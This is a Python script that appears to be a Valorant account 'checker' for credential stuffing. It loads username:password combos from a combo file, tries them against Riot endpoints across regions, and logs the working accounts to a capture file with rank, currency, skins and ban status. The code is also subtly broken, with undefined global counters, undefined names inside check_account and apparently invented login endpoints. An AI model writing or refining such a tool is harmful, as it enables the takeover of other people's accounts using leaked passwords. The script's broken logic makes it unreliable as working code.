import requests
import time
import os
import ctypes
from colorama import Fore, init
from urllib import request
from requests import session as sesh
from requests.adapters import HTTPAdapter
from ssl import PROTOCOL_TLSv1_2
from urllib3 import PoolManager
from tkinter import *
from collections import OrderedDict
from re import compile
import pandas

# Initialize colorama
init(convert=True)

# Define constants
VALORANT_API_URL = "https://pd.{region}.a.pvp.net"
VALORANT_STORE_URL = "https://pd.{region}.a.pvp.net/store/v1/entitlements/{sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433"
SKIN_LIST_URL = "https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt"

# Define regions
REGIONS = {
    "eu": "eu",
    "na": "na",
    "br": "br",
    "kr": "kr",
    "latam": "latam",
    "ap": "ap"
}

# Define skin tiers
SKIN_TIERS = {
    "1-9": (1, 9),
    "10-19": (10, 19),
    "20-29": (20, 29),
    "30-39": (30, 39),
    "40-49": (40, 49),
    "50-99": (50, 99),
    "100-150": (100, 150),
    "151+": (151, float("inf"))
}

# Define ban types
BAN_TYPES = {
    None: "Unbanned"
}

class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block,
                                       ssl_version=PROTOCOL_TLSv1_2)

def get_skin_tier(skin_amount):
    for tier, (min_skins, max_skins) in SKIN_TIERS.items():
        if min_skins <= skin_amount <= max_skins:
            return tier
    return "Unknown"

def get_ban_type(ban_type):
    return BAN_TYPES.get(ban_type, "Unknown")

def center(var, space=None):
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

def update_ui(choice, checked, good, timeban, perban, notexist, rate, num):
    if choice == 1:
        os.system("cls")
        print("")
        print(center(f"Accounts: {Fore.LIGHTGREEN_EX}{num}{Fore.RESET} "))
        print(center(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
        print(center(f"Checked:            [{Fore.YELLOW}{checked}/{num}{Fore.WHITE}]"))
        print(center(f"Good:               [{Fore.GREEN}{good}{Fore.WHITE}]"))
        print(center(f"Timeban:            [{Fore.RED}{timeban}{Fore.WHITE}]"))
        print(center(f"Permban:            [{Fore.RED}{perban}{Fore.WHITE}]"))
        print(center(f"Not exist:          [{Fore.RED}{notexist}{Fore.WHITE}]"))
        print(center(f"Ratelimit           [{Fore.YELLOW}{rate}{Fore.WHITE}]"))
        print(center(f" ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    elif choice == 4:
        os.system("cls")
        print(f"{Fore.RESET}    {Fore.RED}Github.com/xharky{Fore.RESET}     Accounts: {Fore.LIGHTGREEN_EX}{num}{Fore.RESET}")

def check_account(username, password, region, choice):
    try:
        # Create a new session
        session = sesh()
        session.mount("https://", TLSAdapter())

        # Login to Valorant API
        login_response = session.post(f"{VALORANT_API_URL.format(region=region)}/login/v1", json={"username": username, "password": password})
        login_response.raise_for_status()

        # Get entitlement token
        entitlement_response = session.post(f"{VALORANT_API_URL.format(region=region)}/entitlements/v1/token", json={"username": username, "password": password})
        entitlement_response.raise_for_status()
        entitlement_token = entitlement_response.json()["token"]

        # Get account info
        account_response = session.get(f"{VALORANT_API_URL.format(region=region)}/account/v1/accounts/{username}", headers={"X-Riot-Entitlements-JWT": entitlement_token})
        account_response.raise_for_status()
        account_info = account_response.json()

        # Get skin list
        skin_response = requests.get(SKIN_LIST_URL)
        skin_response.raise_for_status()
        skin_list = skin_response.text.splitlines()

        # Get user skins
        user_skins_response = session.get(VALORANT_STORE_URL.format(region=region, sub=account_info["sub"]), headers={"X-Riot-Entitlements-JWT": entitlement_token})
        user_skins_response.raise_for_status()
        user_skins = user_skins_response.json()["Entitlements"]

        # Parse user skins
        skin_amount = 0
        skin_str = ""
        for skin in user_skins:
            skin_id = skin["ItemID"]
            for item in skin_list:
                details = item.split("|")
                name_part = details[0]
                id_part = details[1]
                name = name_part.split(":")[1]
                id = id_part.split(":")[0].lower()
                if id == skin_id:
                    skin_amount += 1
                    skin_str += "| " + name + "\n"

        # Get ban type
        ban_type = None

        # Update UI
        update_ui(choice, checked, good, timeban, perban, notexist, rate, num)

        # Save account info to file
        with open("results//fullcapture.txt", "a+", encoding='utf-8') as f:
            f.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {get_ban_type(ban_type)}\n| Last Game: {account_info['last_game']}\n| Region: {region}\n| Level: {account_info['level']}\n| Email Verified: {account_info['email_verified']}\n| Creation: {account_info['creation']}\n| Rank: {account_info['rank']}\n| VP: {account_info['valorant_points']} - RP: {account_info['radianite']}\n|-------------[Skins({skin_amount})]-------------]\n{skin_str}[------------------------------------]\n\n")

        # Print account info
        if choice == 3:
            print(f"{Fore.GREEN}[Good]{Fore.RESET} User&Pass: {username}:{password} | Banntype: {get_ban_type(ban_type)} | Last Game: {account_info['last_game']} | Region: {region} | Level: {account_info['level']} | Email Verified: {account_info['email_verified']} | Creation: {account_info['creation']} | Rank: {account_info['rank']} | VP: {account_info['valorant_points']} - RP: {account_info['radianite']} [Skins({skin_amount})]")

        return True
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[Error]{Fore.RESET} {e}")
        return False

def main():
    global checked, good, timeban, perban, notexist, rate, num

    print("Github.com/xharky")
    print("[1] GUI")
    print("[2] LOG")
    print("[3] FULL CAPTURE")
    print("[4] FULL CAPTURER GUI")
    print("[5] INFO")

    choice = input("[>] ")
    choice = int(choice)

    if choice == 5:
        print("DC: https://discord.gg/heJ2dzpYPZ")
        print("Option 1: is a static gui on the screen ")
        print("Otption 2 is dynamic lol idk how to describe")
        print("Option 3 is a dynamic full caputure checker")
        time.sleep(5)
        main()

    with open("combo.txt", 'r+', encoding='utf-8') as f:
        lines = f.readlines()

    num = len(lines)

    for line in lines:
        username = line.split(":")[0].replace('\n', '')
        password = line.split(":")[1].replace('\n', '')

        for region in REGIONS.values():
            if check_account(username, password, region, choice):
                good += 1
                break

        checked += 1

        ctypes.windll.kernel32.SetConsoleTitleW(f"Valorant checker | Good: {good} | Timebanned: {timeban} | Permbanned: {perban} | Not exist: {notexist} | Ratelimited: {rate} | Checked: {checked}/{num}")

if __name__ == "__main__":
    main()
